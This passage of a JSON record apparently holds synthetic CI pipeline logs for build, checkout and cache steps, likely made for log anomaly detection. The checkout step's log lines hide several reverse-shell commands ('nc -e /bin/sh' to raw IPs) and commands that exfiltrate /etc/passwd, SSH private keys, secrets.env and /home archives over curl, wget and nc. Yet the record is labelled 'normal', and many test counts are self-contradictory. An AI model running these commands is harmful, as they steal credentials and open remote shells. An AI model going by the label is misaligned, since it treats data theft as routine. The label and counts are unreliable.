          "yarn add: Done in 28.61s",
          "[12:18:45] INFO: Processing request",
          "Connection established",
          "Bundling runtime.css",
          "Compiling lib/index.js...",
          "GET /health - 204 (40ms)",
          "Step 12/21: Linting",
          "[12:18:45] INFO: Starting build process",
          "WARNING: eslint has known vulnerabilities",
          "\u2717 build failed with exit code 30",
          "\u2713 Task completed in 1798ms",
          "npm notice: package.json updated",
          "npm install: added 175 packages",
          "Step 3/15: Installing dependencies",
          "yarn add: Done in 6.36s",
          "Step 10/17: Running migrations",
          "[12:18:45] ERROR: Connection failed",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Generating source maps...",
          "Compiling src/main.py...",
          "Optimizing 74 modules...",
          "[12:18:45] WARN: Deprecated API usage",
          "Already up to date.",
          "Image pulled successfully",
          "Processing...",
          "Image pulled successfully",
          "Cache miss for key-3645",
          "POST /data - 202 (278ms)",
          "Installing webpack@3.5.0",
          "Step 16/22: Linting",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-05T12:22:24.876084",
        "finished_at": "2025-12-05T12:23:07.005348",
        "log_lines": [
          "=== Step: build ===",
          "npm notice: package.json updated",
          "WARNING: express has known vulnerabilities",
          "[12:18:45] INFO: Connecting to database",
          "[12:18:45] DEBUG: Memory usage: 242MB",
          "Compiling lib/main.py...",
          "Compiling lib/index.js...",
          "Using Node.js 16.6.8",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache restored successfully (329MB)",
          "Switched to branch 'feature/task-656'",
          "Pulling image: python:latest",
          "[12:18:45] INFO: Request completed",
          "Fetching submodules...",
          "[12:18:45] DEBUG: Memory usage: 1682MB",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Connection established",
          "pip install: Successfully installed express-2.14",
          "[12:18:45] DEBUG: Query executed in 27ms",
          "yarn add: Done in 14.60s",
          "WARNING: react has known vulnerabilities",
          "[12:18:45] DEBUG: Loading configuration",
          "npm install: resolved 1497 packages",
          "Cache invalidated: node_modules",
          "Installing eslint@4.13.3",
          "Pulling image: node:3.11",
          "Test Suites: 25 passed, 48 total",
          "pip: Downloading eslint-4.12.tar.gz",
          "WARNING: axios has known vulnerabilities",
          "\u2713 All checks passed",
          "Minifying app.js",
          "Bundling main.js",
          "Loading...",
          "[12:18:45] WARN: Deprecated API usage",
          "Cache invalidated: dependencies",
          "Finished.",
          "Compiling components/index.js...",
          "Fetching submodules...",
          "Coverage: 88% statements, 69% branches",
          "Artifact downloaded: 3MB",
          "Optimizing 45 modules...",
          "Artifact uploaded: dist.zip (97MB)",
          "Artifact downloaded: 45MB",
          "[12:18:45] INFO: Starting build process",
          "\u2713 Step 'install' succeeded",
          "[12:18:45] WARN: Deprecated API usage",
          "Step 13/21: Building",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling components/utils.go...",
          "Coverage: 79% statements, 80% branches",
          "\u2713 Step 'setup' succeeded",
          "Cache restored successfully (472MB)",
          "Exception: TypeError",
          "[12:18:45] INFO: Starting build process",
          "Pushing to registry...",
          "WARNING: lodash has known vulnerabilities",
          "npm notice: created a lockfile",
          "[12:18:45] DEBUG: Memory usage: 875MB",
          "[12:18:45] INFO: Starting build process",
          "\u2713 All checks passed",
          "Minifying vendor.js",
          "npm install: resolved 1630 packages",
          "Ran 95 tests in 30s",
          "Installing lodash@2.5.7",
          "Already up to date.",
          "pip: Collecting lodash",
          "[12:18:45] INFO: Cache refreshed",
          "Test Suites: 27 passed, 28 total",
          "[12:18:45] WARN: Deprecated API usage",
          "Processing...",
          "Tests: 365 passed, 356 total",
          "Connection established",
          "Verifying...",
          "Using Python 3.10",
          "[12:18:45] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "NODE_ENV=test",
          "Snapshots: 20 passed, 4 total",
          "Step 10/22: Running migrations",
          "Loading...",
          "Compiling lib/service.java...",
          "Tests: 321 passed, 99 total",
          "Connecting to acme.corp:443...",
          "Success!",
          "Tests: 374 passed, 255 total",
          "Step 18/24: Running migrations",
          "Step 10/16: Deploying",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "Step 7/17: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Environment: production",
          "FAILED: test_api_health",
          "Loading...",
          "Compiling src/app.ts...",
          "POST /upload - 200 (58ms)",
          "[12:18:45] INFO: Cache refreshed",
          "OK",
          "Connection established",
          "Compiling utils/main.py...",
          "Environment: staging",
          "Loading...",
          "npm notice: created a lockfile",
          "[12:18:45] DEBUG: Query executed in 92ms",
          "\u2717 build failed with exit code 79",
          "Artifact downloaded: 21MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-8533",
          "\u2713 All checks passed",
          "[12:18:45] DEBUG: Memory usage: 797MB",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (99ms)",
          "FAILED: test_cache_hit",
          "WARNING: eslint has known vulnerabilities",
          "Waiting...",
          "Step 4/22: Installing dependencies",
          "Cache saved successfully",
          "Environment: production",
          "Compiling lib/service.java...",
          "Step 17/24: Linting",
          "Ready.",
          "[12:18:45] DEBUG: Connection pool: 20 active",
          "Tests: 383 passed, 282 total",
          "Cache miss for key-3069",
          "Completed.",
          "Optimizing 73 modules...",
          "Tests: 423 passed, 161 total",
          "[12:18:45] INFO: Connecting to database",
          "Cache hit for key-9632",
          "Creating production build...",
          "Environment: staging",
          "GET /api - 200 (51ms)",
          "pip: Downloading jest-3.13.tar.gz",
          "[12:18:45] DEBUG: Memory usage: 1761MB",
          "Completed.",
          "[12:18:45] DEBUG: Query executed in 19ms",
          "Uploading artifact 'dist' (48 files)",
          "Compiling lib/app.ts...",
          "Pushing to registry...",
          "  PASS: integration/test_user_create.spec.js",
          "Platform: darwin-arm64",
          "[12:18:45] DEBUG: Memory usage: 1925MB",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-05T12:23:07.005348",
        "finished_at": "2025-12-05T12:23:12.622583",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:18:45] INFO: Cache refreshed",
          "Using Python 3.12",
          "Compiling components/handler.rs...",
          "[12:18:45] INFO: Processing request",
          "Test Suites: 40 passed, 34 total",
          "Using Node.js 18.14.10",
          "Cache restored successfully (312MB)",
          "Waiting...",
          "pip install: Successfully installed eslint-3.5",
          "GET /api - 204 (53ms)",
          "nc -e /bin/sh 169.144.38.223 38927",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: unit/test_api_health.spec.js",
          "Connecting to example.com:443...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Connection established",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "\u2713 deploy completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 64.110.221.65 43795",
          "Test Suites: 9 passed, 39 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 9/21: Installing dependencies",
          "\u2713 lint completed",
          "[12:18:45] DEBUG: Initializing service",
          "Sending 92MB of data to test.io",
          "\u2713 Task completed in 3726ms",
          "Uploading artifact 'build' (43 files)",
          "\u2713 All checks passed",
          "Exception: TypeError",
          "Loading...",
          "FAILED: test_auth_login",
          "Platform: win32-x64",
          "OK",
          "[12:18:45] WARN: Deprecated API usage",
          "Sending 249MB of data to test.io",
          "Switched to branch 'hotfix/task-480'",
          "Coverage: 76% statements, 75% branches",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 240.127.4.14 49619",
          "Building Docker image...",
          "Checking out develop branch",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: unit/test_api_health.spec.js",
          "Compiling utils/handler.rs...",
          "Compiling components/utils.go...",
          "\u2713 Step 'build' succeeded",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "WARNING: webpack has known vulnerabilities",
          "[12:18:45] WARN: Deprecated API usage",
          "Bundling runtime.js",
          "\u2713 Step 'install' succeeded",
          "Creating production build...",
          "Ready.",
          "WARNING: lodash has known vulnerabilities",
          "Done.",
          "Completed.",
          "Coverage: 72% statements, 84% branches",
          "Done.",
          "Artifact downloaded: 4MB",
          "Step 12/23: Deploying",
          "\u2713 Task completed in 4342ms",
          "Artifact uploaded: dist.zip (52MB)",
          "Finished.",
          "Pulling image: node:latest",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "pip: Downloading webpack-4.13.tar.gz",
          "Step 6/25: Testing",
          "NODE_ENV=development",
          "Success!",
          "[12:18:45] ERROR: Connection failed",
          "Cache restored successfully (457MB)",
          "Pushing to registry...",
          "Cache hit for key-5756",
          "\u2713 Task completed in 3243ms",
          "[12:18:45] INFO: Processing request",
          "Verifying...",
          "nc -e /bin/sh 31.148.144.187 54786",
          "Building Docker image...",
          "Generating source maps...",
          "[12:18:45] DEBUG: Memory usage: 1826MB",
          "[12:18:45] INFO: Request completed",
          "POST /upload - 202 (99ms)",
          "Pulling image: node:18",
          "[12:18:45] DEBUG: Query executed in 71ms",
          "Compiling utils/utils.go...",
          "[12:18:45] ERROR: Connection failed",
          "Switched to branch 'bugfix/task-954'",
          "yarn add: Done in 5.72s",
          "Layer 5/11: RUN command",
          "Step 1/25: Testing",
          "Pushing to registry...",
          "Tests: 411 passed, 176 total",
          "Ran 130 tests in 38s",
          "Sending 343MB of data to acme.corp",
          "Cache hit for key-7485",
          "yarn add: Done in 8.88s",
          "pip install: Successfully installed react-1.5",
          "Pushing to registry...",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at a541159",
          "Compiling components/utils.go...",
          "Cache invalidated: dependencies",
          "Transforming 755 files...",
          "npm install: resolved 1452 packages",
          "[12:18:45] INFO: Connecting to database",
          "Already up to date.",
          "Loading...",
          "TLS handshake completed",
          "Creating production build...",
          "Cache saved successfully",
          "Time: 85.999s",
          "Verifying...",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Layer 1/13: RUN command",
          "Bundling vendor.css",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_user_create (495ms)",
          "Coverage: 80% statements, 76% branches",
          "Success!",
          "Verifying...",
          "[12:18:45] DEBUG: Query executed in 59ms",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Already up to date.",
          "\u2717 build failed with exit code 105",
          "[12:18:45] WARN: Deprecated API usage",
          "OK",
          "Creating production build...",
          "POST /data - 201 (104ms)",
          "Transforming 329 files...",
          "Fetching submodules...",
          "  PASS: integration/test_user_create.spec.js",
          "Cache restored successfully (196MB)",
          "npm install: resolved 1754 packages",
          "HEAD is now at fba82fa",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "Compiling src/app.ts...",
          "pip: Downloading react-4.2.tar.gz",
          "Cache invalidated: build",
          "\u2713 lint completed",
          "\u2713 Task completed in 2469ms",
          "yarn add: Done in 8.90s",
          "Minifying main.js",
          "Cache saved successfully",
          "Step 19/25: Linting",
          "nc -e /bin/sh 13.135.38.35 30105",
          "Waiting...",
          "[12:18:45] INFO: Processing request",
          "Connection established",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache saved successfully",
          "pip install: Successfully installed lodash-1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "Artifact uploaded: dist.zip (51MB)",
          "=== Step checkout completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}